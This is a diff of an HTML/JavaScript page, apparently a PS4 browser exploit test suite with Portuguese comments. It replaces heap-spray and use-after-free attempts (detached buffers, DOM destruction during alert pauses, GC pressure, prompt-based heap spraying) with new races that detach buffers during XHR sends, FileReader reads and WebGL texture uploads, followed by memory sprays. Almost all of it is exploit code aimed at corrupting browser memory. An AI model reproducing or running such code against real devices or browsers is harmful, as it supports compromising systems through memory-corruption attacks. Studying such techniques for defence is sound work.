@@ -2,48 +2,39 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 Suite v480000: Modal Corruption</title>
+<title>PS4 Suite v490000: The Buffer War</title>
 <style>
-    body { background: #100; color: #ff5; font-family: monospace; text-align: center; padding: 10px; }
-    h1 { border-bottom: 2px solid #ff5; color: #fff; }
+    body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding: 10px; }
+    h1 { border-bottom: 2px solid #0f0; color: #fff; }
     .status { 
         border: 2px solid #fff; padding: 15px; margin-bottom: 20px; 
-        font-size: 1.2em; background: #300; color: #fff; font-weight: bold;
+        font-size: 1.2em; background: #020; color: #fff; font-weight: bold;
     }
-    .inst { font-size: 0.9em; color: #faa; margin-bottom: 15px; font-weight: bold; }
     
     button {
-        display: block; width: 100%; padding: 20px; margin: 10px 0;
-        background: #410; color: #fff; border: 2px solid #ff5;
-        font-size: 18px; font-weight: bold; cursor: pointer; text-transform: uppercase;
+        display: block; width: 100%; padding: 25px; margin: 15px 0;
+        background: #030; color: #fff; border: 2px solid #0f0;
+        font-size: 20px; font-weight: bold; cursor: pointer; text-transform: uppercase;
     }
-    button:hover { background: #ff5; color: #000; }
+    button:hover { background: #0f0; color: #000; }
     
     #stage { background: #111; height: 50px; border: 1px solid #555; margin-top: 20px; }
 </style>
 </head>
 <body>
 
-<h1>v480000: MODAL CORRUPTION</h1>
+<h1>v490000: THE BUFFER WAR</h1>
 
 <div class="status" id="msg">
-    FOCO: CORRUPÇÃO DE MEMÓRIA DURANTE A PAUSA JS<br>
+    ALVO: ESTADO ZUMBI DE FULLSCREEN + UAF<br>
     CLIQUE -> FULLSCREEN -> SIGA INSTRUÇÃO
 </div>
 
-<div class="inst">
-    INSTRUÇÃO CRÍTICA: Quando a caixa aparecer, tente dar REFRESH (Atualizar) antes de clicar em OK. Se não conseguir, clique em OK rapidamente.
-</div>
+<button onclick="war(b01)">01. Network Packet UAF (XHR Send)</button>
 
-<button onclick="corrupt(c01)">01. Detached Buffer Race (UAF)</button>
+<button onclick="war(b02)">02. FileReader Blob Confusion</button>
 
-<button onclick="corrupt(c02)">02. DOM Surgery & Reflow Freeze</button>
-
-<button onclick="corrupt(c03)">03. Garbage Collector Panic Prompt</button>
-
-<button onclick="corrupt(c04)">04. Event Handler Zombie Confirm</button>
-
-<button onclick="corrupt(c05)">05. Prompt Heap Spray (Pointer Setup)</button>
+<button onclick="war(b03)">03. WebGL Texture Upload Race</button>
 
 <div id="stage">ALVO</div>
 
@@ -51,14 +42,16 @@
     const Stage = document.getElementById('stage');
     const Msg = document.getElementById('msg');
     
-    // Armazém global para manter memória ocupada ou sprays
-    let heap_keep_alive = [];
-    // Spray padrão "AAAA" para estabilizar crashes
-    const spray_pattern = new Uint32Array(1024).fill(0x41414141);
+    // Worker Genérico que aceita buffers e não faz nada
+    const workerBlob = new Blob(["onmessage=function(e){ postMessage('done'); }"], {type:'text/javascript'});
+    const workerUrl = URL.createObjectURL(workerBlob);
 
-    function corrupt(vectorFunc) {
+    // Spray Global
+    let spray_store = [];
+
+    function war(vectorFunc) {
         Stage.innerHTML = "";
-        heap_keep_alive = [];
+        spray_store = [];
         
         // 1. Configura
         const target = vectorFunc(Stage);
@@ -67,203 +60,149 @@
         if (target.webkitRequestFullscreen) target.webkitRequestFullscreen();
         else if (target.requestFullscreen) target.requestFullscreen();
 
-        // 3. Execução com pequeno delay para garantir o fullscreen
+        // 3. Execução
         requestAnimationFrame(() => {
             setTimeout(() => {
                 if(target._exec) target._exec();
-            }, 300);
+            }, 500);
         });
     }
 
     // =================================================================
-    // 01. Detached Buffer Race (UAF)
-    // Tenta acessar um buffer de memória que foi "desanexado" (transferido
-    // para um Worker) exatamente no momento que o alerta pausa a thread.
+    // 01. Network Packet UAF (XHR Send)
+    // Tenta enviar um Buffer pela rede (XHR). Enquanto o driver de rede
+    // prepara o pacote, transferimos o buffer para um Worker.
+    // O Alerta pausa o JS, mas o driver de rede continua tentando ler.
     // =================================================================
-    function c01(stage) {
+    function b01(stage) {
         const d = document.createElement('div');
-        d.innerText = "BUFFER RACE";
+        d.innerText = "NETWORK RACE";
         stage.appendChild(d);
 
-        // Cria um worker para receber o buffer
-        const blob = new Blob(["onmessage=function(e){ postMessage('done'); }"], {type:'text/javascript'});
-        const worker = new Worker(URL.createObjectURL(blob));
+        // Cria Worker
+        const w = new Worker(workerUrl);
         
-        // Cria o buffer vítima
-        let buffer = new ArrayBuffer(1024 * 1024 * 10); // 10MB
-        let view = new Uint8Array(buffer);
-        view[0] = 1;
+        // Cria Buffer Grande (16MB)
+        const buffer = new ArrayBuffer(1024 * 1024 * 16);
+        const view = new Uint8Array(buffer);
+        view.fill(0x41); // Enche de 'A'
 
         d._exec = () => {
-            Msg.innerText = ">>> TENTE DAR REFRESH COM O ALERTA ABERTO <<<";
+            Msg.innerText = ">>> CLIQUE OK RAPIDAMENTE <<<";
             
-            // O GOLPE:
-            // 1. Transfere o buffer (ele fica inutilizável nesta thread)
-            try { worker.postMessage(buffer, [buffer]); } catch(e){}
+            // 1. Inicia envio assíncrono (AJAX)
+            const xhr = new XMLHttpRequest();
+            xhr.open("POST", "/crash_test", true); // URL falsa
             
-            // 2. PAUSA TUDO IMEDIATAMENTE
-            window.alert("⚠️ BUFFER DETACHED ⚠️\nO JavaScript está pausado. A memória do buffer foi liberada.\nAo clicar OK, tentaremos ler essa memória morta.");
+            // O driver de rede começa a ler 'view' aqui
+            try { xhr.send(view); } catch(e){} 
             
-            // 3. A RETOMADA (Se o refresh não matar antes)
-            // Tenta ler o buffer desanexado. Isso deve lançar erro ou crashar.
+            // 2. IMEDIATAMENTE transfere a memória para o Worker (Detach)
+            // A memória é removida da Thread Principal
+            w.postMessage(buffer, [buffer]);
+            
+            // 3. PAUSA BRUTAL
+            // Se o driver de rede tentar ler o buffer durante esta pausa -> Kernel Panic
+            window.alert("⚠️ NETWORK DETACHED ⚠️\nAo clicar OK, verificaremos se o driver de rede sobreviveu.");
+            
+            // 4. Se sobreviveu, tentamos sujar a memória liberada
+            for(let i=0; i<1000; i++) spray_store.push(new Uint32Array(1024).fill(0xDEADBEEF));
+            
+            d.innerText = "Sobreviveu. Tente Refresh agora.";
+        };
+        return d;
+    }
+
+    // =================================================================
+    // 02. FileReader Blob Confusion
+    // Cria um Blob a partir de um buffer, inicia leitura, e desanexa
+    // o buffer original no meio do processo.
+    // =================================================================
+    function b02(stage) {
+        const d = document.createElement('div');
+        d.innerText = "FILE READER RACE";
+        stage.appendChild(d);
+
+        const w = new Worker(workerUrl);
+        
+        // Buffer Vítima
+        const buffer = new ArrayBuffer(1024 * 1024 * 10); // 10MB
+        const view = new Uint8Array(buffer);
+        view.fill(0x42);
+
+        // Cria Blob apontando para essa memória
+        const blob = new Blob([view]);
+        const reader = new FileReader();
+
+        d._exec = () => {
+            Msg.innerText = ">>> AGUARDE O ALERTA <<<";
+            
+            // 1. Inicia leitura do Blob
+            reader.readAsArrayBuffer(blob);
+            
+            // 2. Transfere o buffer original (Destrói a fonte do Blob?)
+            // Dependendo da implementação, o Blob pode manter referência ou copiar.
+            // Se for Zero-Copy, isso causa UAF.
+            w.postMessage(buffer, [buffer]);
+            
+            // 3. PAUSA
+            window.alert("⚠️ READER CONFUSION ⚠️\nO Blob aponta para memória movida.\nClique OK.");
+            
+            // 4. Spray
+            const spray = new Float64Array(100000).fill(1.1);
+            spray_store.push(spray);
+        };
+        return d;
+    }
+
+    // =================================================================
+    // 03. WebGL Texture Upload Race
+    // Tenta enviar o buffer para a GPU como textura.
+    // WebGL valida os dados, mas se pausarmos com Alerta no meio,
+    // podemos confundir a validação.
+    // =================================================================
+    function b03(stage) {
+        const d = document.createElement('div');
+        d.innerText = "WEBGL RACE";
+        stage.appendChild(d);
+
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl');
+        
+        if(!gl) { d.innerText = "NO WEBGL"; return d; }
+
+        const w = new Worker(workerUrl);
+        const buffer = new ArrayBuffer(1024 * 1024 * 4); // 4MB Texture
+        const view = new Uint8Array(buffer);
+        view.fill(255);
+
+        const texture = gl.createTexture();
+        gl.bindTexture(gl.TEXTURE_2D, texture);
+
+        d._exec = () => {
+            Msg.innerText = ">>> CLIQUE OK <<<";
+            
+            // 1. Prepara upload
+            // texImage2D lê do buffer
+            
+            // 2. Race: Detach buffer ANTES do comando GL terminar?
+            // Difícil sincronizar, mas o Alert ajuda.
+            
+            w.postMessage(buffer, [buffer]);
+            
+            // 3. Tenta subir textura de buffer morto
             try {
-                const val = view[0]; // Acesso ilegal
-                d.innerText = "Buffer Read: " + val; // Se chegar aqui, falhou
+                gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 1024, 1024, 0, gl.RGBA, gl.UNSIGNED_BYTE, view);
             } catch(e) {
-                 d.innerText = "Read Error (Expected): " + e.message;
-                 // Se deu erro JS, tentamos preencher o buraco
-                 for(let i=0; i<100; i++) heap_keep_alive.push(new Uint32Array(spray_pattern));
+                // Erro JS esperado
             }
-        };
-        return d;
-    }
-
-    // =================================================================
-    // 02. DOM Surgery & Reflow Freeze
-    // Realiza uma mudança drástica no DOM e chama o alerta imediatamente,
-    // pausando o motor de renderização no meio do cálculo de layout.
-    // =================================================================
-    function c02(stage) {
-        const d = document.createElement('div');
-        d.innerText = "DOM SURGERY";
-        stage.appendChild(d);
-
-        // Cria estrutura complexa
-        const container = document.createElement('div');
-        container.style.display = 'flex';
-        for(let i=0; i<5000; i++) {
-            const s = document.createElement('div');
-            s.style.flex = '1'; s.innerText = i;
-            container.appendChild(s);
-        }
-        document.body.appendChild(container);
-
-        d._exec = () => {
-            Msg.innerText = ">>> LAYOUT CONGELADO <<<";
             
-            // O GOLPE:
-            // 1. Destrói a estrutura complexa (invalida o layout)
-            container.remove();
+            // 4. PAUSA IMEDIATA
+            window.alert("⚠️ GPU UPLOAD PAUSED ⚠️\nO driver de vídeo tentou ler o buffer?");
             
-            // 2. PAUSA TUDO (O motor de renderização fica com referências pendentes)
-            window.alert("⚠️ DOM DESTROYED ⚠️\nO motor de layout foi interrompido.");
-            
-            // 3. A RETOMADA: Força um recálculo de layout síncrono
-            // Se o motor não limpou as referências antigas durante a pausa, crash.
-            const forceReflow = document.body.offsetWidth;
-            document.body.innerHTML = "REFLOW COMPLETE: " + forceReflow;
-        };
-        return d;
-    }
-
-    // =================================================================
-    // 03. Garbage Collector Panic Prompt
-    // Cria pressão massiva de memória e usa o 'prompt' para pausar.
-    // Esperamos que o GC rode agressivamente durante a pausa e cometa um erro.
-    // =================================================================
-    function c03(stage) {
-        const d = document.createElement('div');
-        d.innerText = "GC PANIC";
-        stage.appendChild(d);
-
-        d._exec = () => {
-            let count = 0;
-            function loop() {
-                count++;
-                Msg.innerText = "CICLO GC: " + count;
-                
-                // Aloca 50MB de lixo temporário
-                let junk_pile = [];
-                for(let i=0; i<50; i++) junk_pile.push(new Uint8Array(1024*1024));
-                
-                // Objeto vítima que queremos que o GC colete incorretamente
-                let victim = { id: count, vital_data: new Array(100).fill(1.1) };
-                
-                // Libera a referência para o lixo e a vítima
-                junk_pile = null;
-                // victim = null; // Mantenha comentado para testar pressão, descomente para UAF direto
-
-                // PAUSA: O Prompt segura a execução. O GC pode rodar aqui.
-                const input = window.prompt("⚠️ PRESSÃO DE MEMÓRIA MÁXIMA ⚠️\nCiclo " + count + ".\nClique OK rápido ou tente Refresh.", "Aguardando GC...");
-                
-                // A RETOMADA: Tenta acessar a vítima.
-                if(victim && victim.vital_data[0] !== 1.1) {
-                     // Se o valor mudou, houve corrupção!
-                     document.body.innerHTML = "<h1>CORRUPTION DETECTED!</h1>";
-                     return; // Para o loop
-                }
-
-                if(count < 10) setTimeout(loop, 100);
-            }
-            loop();
-        };
-        return d;
-    }
-
-    // =================================================================
-    // 04. Event Handler Zombie Confirm
-    // Cria um botão, clica nele via script, e dentro do evento do clique
-    // destrói o botão e abre um 'confirm'. O handler tenta continuar depois.
-    // =================================================================
-    function c04(stage) {
-        const btn = document.createElement('button');
-        btn.innerText = "CLIQUE-ME (ZUMBI)";
-        stage.appendChild(btn);
-
-        btn.onclick = function() {
-            // 1. Destrói o próprio elemento que gerou o evento
-            btn.remove();
-            
-            // 2. PAUSA (O contexto de execução do evento fica suspenso)
-            const result = window.confirm("⚠️ O BOTÃO FOI DESTRUÍDO ⚠️\nO manipulador de evento ainda está rodando.\nClique OK para continuar.");
-            
-            // 3. A RETOMADA: Tenta acessar propriedades do elemento morto
-            try {
-                // Acesso a 'this' (que era o btn)
-                const text = this.innerText;
-                console.log(text);
-                // Spray para tentar pegar a memória liberada
-                for(let i=0; i<1000; i++) heap_keep_alive.push(new Uint32Array(spray_pattern));
-            } catch(e) {
-                document.body.innerText = "Erro JS (Normal): " + e.message;
-            }
-        };
-
-        d._exec = () => {
-            Msg.innerText = ">>> DISPARANDO EVENTO ZUMBI <<<";
-            setTimeout(() => {
-                btn.click(); // Dispara o evento programaticamente
-            }, 500);
-        };
-        return btn;
-    }
-
-    // =================================================================
-    // 05. Prompt Heap Spray (Pointer Setup)
-    // Usa a caixa de input do 'prompt' para injetar strings específicas
-    // na memória. Isso não crasha sozinho, mas prepara o terreno.
-    // =================================================================
-    function c05(stage) {
-        const d = document.createElement('div');
-        d.innerText = "HEAP SPRAY PROMPT";
-        stage.appendChild(d);
-
-        // Cria uma string gigante que representa ponteiros falsos (AAAA...)
-        // 0x41 é 'A'. Usamos unescape para criar a string binária crua.
-        let payload = "";
-        for(let i=0; i<2000; i++) payload += unescape("%u4141%u4141");
-
-        d._exec = () => {
-            Msg.innerText = ">>> INJETANDO PONTEIROS FALSOS <<<";
-            
-            // Abre o prompt repetidamente com o valor padrão sendo nosso payload
-            // Cada vez que o prompt abre, o navegador aloca essa string na memória.
-            for(let i=0; i<5; i++) {
-                window.prompt("INJEÇÃO DE HEAP #" + (i+1) + "\nNão digite nada, apenas clique OK.", payload);
-                // Mantém referência para não ser coletado pelo GC
-                heap_keep_alive.push(payload.substr(0, payload.length)); 
-            }
-            d.innerText = "Spray completo. Memória preparada.";
+            // 5. Destruição
+            gl.deleteTexture(texture);
+            spray_store.push(new ArrayBuffer(1024*1024));
         };
         return d;
     }
